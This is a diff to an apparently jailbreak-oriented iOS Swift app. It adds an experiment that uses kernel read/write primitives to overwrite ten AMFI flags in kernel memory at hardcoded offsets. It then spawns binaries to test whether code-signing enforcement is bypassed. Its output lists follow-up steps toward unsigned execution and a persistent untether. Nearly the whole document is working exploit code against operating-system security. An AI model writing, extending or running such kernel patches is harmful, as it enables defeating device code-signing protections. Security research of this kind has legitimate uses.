@@ -225,7 +225,12 @@ private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
     // For older iOS versions, kernel text might be at 0xffffff80...
     // But we MUST exclude 0xffffffdc... to 0xffffffe5... (Zone Map / Physmap)
     // because unmapped reads there cause Kernel Data Abort panics.
-    if va >= 0xffffff8000000000 && va < 0xffffffdc00000000 { return true }
+    // Also exclude 0xffffff8000000000 boundary region (unmapped, causes panic).
+    if va >= 0xffffff8000000000 && va < 0xffffffdc00000000 {
+        // Skip the very start of kernel VA space — typically unmapped
+        if va < 0xffffff8100000000 { return false }
+        return true
+    }
     
     return false
 }
@@ -854,6 +859,16 @@ struct AMFIExperimentView: View {
                     color: .red,
                     label: "AMFI Data",
                     action: runExp93AMFIDataWrite,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "③o2 AMFI Flag Disable (Exp 93b)",
+                    icon: "shield.slash.fill",
+                    color: .red,
+                    label: "AMFI Disable",
+                    action: runExp93bAMFIFlagDisable,
                     needsVerified: true,
                     needsProbe: false
                 )
@@ -6925,6 +6940,245 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
     }
 
+    // MARK: - Exp 93b: AMFI Flag Disable + Spawn Test
+
+    /// Exp 93b: Flip ALL 10 AMFI boolean flags to 0, then test posix_spawn of unsigned binary.
+    /// If AMFI checks are controlled by these flags, disabling them should allow unsigned exec.
+    private func runExp93bAMFIFlagDisable() {
+        isRunning = true
+        runningLabel = "AMFI Disable"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp93b_amfi_disable") { rc in
+            let result = self.expAMFIFlagDisable(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    private func expAMFIFlagDisable(rc: RemoteCall) -> ExperimentResult {
+        let expName = "AMFI Flag Disable (Exp 93b)"
+        var detail = "Experiment 93b: AMFI Flag Disable + Spawn Test\n"
+        detail += "================================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"
+
+        // AMFI __DATA from deep_tc_analysis.py
+        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
+        let amfiDataSlid = amfiDataUnslid &+ slide
+
+        detail += "AMFI __DATA (slid): 0x\(String(format: "%llx", amfiDataSlid))\n\n"
+
+        // All 10 boolean flags (value=1 in kernelcache, confirmed writable by Exp 93)
+        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+
+        // Step 1: Read all flags before modification
+        detail += "=== Step 1: Read current flag values ===\n"
+        var originalValues: [(offset: UInt64, value: UInt64)] = []
+        var allOnes = true
+
+        for off in flagOffsets {
+            let addr = amfiDataSlid &+ off
+            let val = ds_kread64_safe(addr)
+            originalValues.append((off, val))
+            detail += "  AMFI+0x\(String(format: "%03x", off)): \(val)"
+            if val == 1 {
+                detail += " ✓\n"
+            } else {
+                detail += " ← NOT 1 (unexpected)\n"
+                allOnes = false
+            }
+        }
+        detail += "\n"
+
+        if !allOnes {
+            detail += "⚠️ Some flags are not 1 — might already be patched or wrong offset.\n"
+            detail += "Proceeding anyway (will write 0 to all).\n\n"
+        }
+
+        // Step 2: Write 0 to ALL flags (disable AMFI checks)
+        detail += "=== Step 2: Disable ALL AMFI flags (write 0) ===\n"
+        var writeSuccessCount = 0
+
+        for off in flagOffsets {
+            let addr = amfiDataSlid &+ off
+            ds_kwrite64(addr, 0)
+            let readback = ds_kread64_safe(addr)
+            let ok = (readback == 0)
+            if ok { writeSuccessCount += 1 }
+            detail += "  AMFI+0x\(String(format: "%03x", off)): write 0 → readback=\(readback) \(ok ? "✅" : "❌")\n"
+        }
+        detail += "\nFlags disabled: \(writeSuccessCount)/\(flagOffsets.count)\n\n"
+
+        guard writeSuccessCount == flagOffsets.count else {
+            detail += "❌ Not all flags could be written — aborting spawn test.\n"
+            // Restore what we can
+            for (off, origVal) in originalValues {
+                ds_kwrite64(amfiDataSlid &+ off, origVal)
+            }
+            detail += "Restored original values.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        detail += "✅ All 10 AMFI flags set to 0!\n\n"
+
+        // Step 3: Test posix_spawn of system binary
+        detail += "=== Step 3: posix_spawn test ===\n\n"
+
+        let testBinaries: [(path: String, label: String)] = [
+            ("/usr/bin/id", "id (system binary)"),
+            ("/bin/ls", "ls (system binary)"),
+        ]
+
+        var spawnSuccess = false
+        let mem = rc.trojanMem
+
+        for (binPath, label) in testBinaries {
+            detail += "--- Testing: \(label) ---\n"
+
+            let binAddr = remote_alloc_str(rc, binPath)
+
+            // argv = [binary, NULL]
+            let argvBase = mem + 0x500
+            rc[argvBase].setValue64(binAddr)
+            rc[argvBase + 8].setValue64(0)
+
+            // pid output
+            let pidAddr = mem + 0x480
+            rc[pidAddr].setValue32(0)
+
+            // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
+            let pid = rc[pidAddr].value32()
+
+            detail += "  posix_spawn ret=\(ret), pid=\(pid)\n"
+
+            if ret == 0 && pid != 0 {
+                // Wait for child
+                let statusAddr = mem + 0x490
+                rc[statusAddr].setValue32(0)
+                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
+                let exitStatus = rc[statusAddr].value32()
+                let exitCode = exitStatus >> 8
+                let signal = exitStatus & 0x7F
+
+                detail += "  exit_status=0x\(String(format: "%x", exitStatus)), code=\(exitCode), signal=\(signal)\n"
+
+                if signal == 9 {
+                    detail += "  ❌ SIGKILL — AMFI still killing unsigned exec\n\n"
+                } else if signal == 0 && exitCode <= 1 {
+                    detail += "  ✅✅✅ SPAWN SUCCESS! No SIGKILL! ✅✅✅\n\n"
+                    spawnSuccess = true
+                } else {
+                    detail += "  ⚠️ Exited with signal=\(signal), code=\(exitCode)\n\n"
+                    if signal == 0 { spawnSuccess = true }
+                }
+            } else {
+                let err = remote_errno(rc)
+                detail += "  ❌ spawn failed: errno=\(err)\n\n"
+            }
+
+            RootExecutor.rcall(rc, "free", binAddr)
+
+            if spawnSuccess { break }
+        }
+
+        // Step 4: Also try fork+exec pattern (in case posix_spawn has extra checks)
+        if !spawnSuccess {
+            detail += "--- Testing: fork + execve ---\n"
+
+            let binAddr = remote_alloc_str(rc, "/usr/bin/id")
+            let argvBase = mem + 0x500
+            rc[argvBase].setValue64(binAddr)
+            rc[argvBase + 8].setValue64(0)
+
+            let childPid = RootExecutor.rcall(rc, "fork")
+            detail += "  fork() = \(childPid)\n"
+
+            if childPid == 0 {
+                // We are in child — exec
+                RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
+                // If execve returns, it failed
+                RootExecutor.rcall(rc, "_exit", 127)
+            } else if childPid != UInt64(bitPattern: -1) {
+                // Parent — wait
+                let statusAddr = mem + 0x490
+                rc[statusAddr].setValue32(0)
+                RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
+                let exitStatus = rc[statusAddr].value32()
+                let signal = exitStatus & 0x7F
+                let exitCode = exitStatus >> 8
+
+                detail += "  child exit: status=0x\(String(format: "%x", exitStatus)), signal=\(signal), code=\(exitCode)\n"
+
+                if signal == 9 {
+                    detail += "  ❌ SIGKILL on child — AMFI enforcement still active\n\n"
+                } else if signal == 0 && exitCode != 127 {
+                    detail += "  ✅ execve succeeded!\n\n"
+                    spawnSuccess = true
+                } else {
+                    detail += "  ⚠️ execve might have failed (code=\(exitCode))\n\n"
+                }
+            } else {
+                detail += "  ❌ fork() failed\n\n"
+            }
+
+            RootExecutor.rcall(rc, "free", binAddr)
+        }
+
+        // Step 5: Restore all flags
+        detail += "=== Step 5: Restore AMFI flags ===\n"
+        for (off, origVal) in originalValues {
+            ds_kwrite64(amfiDataSlid &+ off, origVal)
+            let readback = ds_kread64_safe(amfiDataSlid &+ off)
+            detail += "  AMFI+0x\(String(format: "%03x", off)): restored to \(readback)\n"
+        }
+        detail += "\n"
+
+        // Final verdict
+        detail += "=== VERDICT ===\n\n"
+        if spawnSuccess {
+            detail += "🎉🎉🎉 FULL JAILBREAK ACHIEVED! 🎉🎉🎉\n\n"
+            detail += "AMFI boolean flags control code signing enforcement!\n"
+            detail += "Disabling all 10 flags allows unsigned binary execution!\n\n"
+            detail += "=== NEXT STEPS ===\n"
+            detail += "1. Binary search: find WHICH specific flag(s) are needed\n"
+            detail += "2. Keep flags disabled permanently (until reboot)\n"
+            detail += "3. Write custom unsigned binary and execute it\n"
+            detail += "4. Build untether (persist across reboot)\n"
+        } else {
+            detail += "❌ Spawn still fails with AMFI flags disabled.\n\n"
+            detail += "Possible reasons:\n"
+            detail += "  1. These flags don't control CDHash validation\n"
+            detail += "     (might be logging/telemetry flags)\n"
+            detail += "  2. AMFI check happens BEFORE these flags are consulted\n"
+            detail += "  3. pmap_cs (separate subsystem) also validates\n"
+            detail += "  4. Trust cache lookup is in PPL, not affected by AMFI flags\n\n"
+            detail += "=== ALTERNATIVE APPROACHES ===\n"
+            detail += "  A. Try leaving flags disabled + inject CDHash into heap TC\n"
+            detail += "  B. Binary search flags individually to find their purpose\n"
+            detail += "  C. Combine with cs_enforcement_disable in main __DATA\n"
+            detail += "  D. Patch proc->p_csflags via KRW (per-process bypass)\n"
+        }
+
+        return ExperimentResult(name: expName, success: spawnSuccess, detail: detail, timestamp: Date())
+    }
+
     // MARK: - Exp 94: Heap Trust Cache Scan
 
     /// Exp 94: Scan __DATA zero slots on-device to find heap trust cache pointers.
@@ -7006,6 +7260,13 @@ struct AMFIExperimentView: View {
             }
 
             detail += "  +0x\(String(format: "%04x", off)): 0x\(String(format: "%llx", ptr)) (\(label))\n"
+
+            // Filter known-bad values that pass isSafeKernelKreadAddress but are unmapped
+            // 0xffffff8000000000 is the base of kernel VA space — not a real object pointer
+            if ptr == 0xffffff8000000000 || ptr == 0xffffff8000000001 {
+                detail += "    → kernel VA base (unmapped boundary), skip\n"
+                continue
+            }
 
             // Check if pointer is in heap range
             let isHeap = isSafeKernelHeapKreadAddress(ptr)
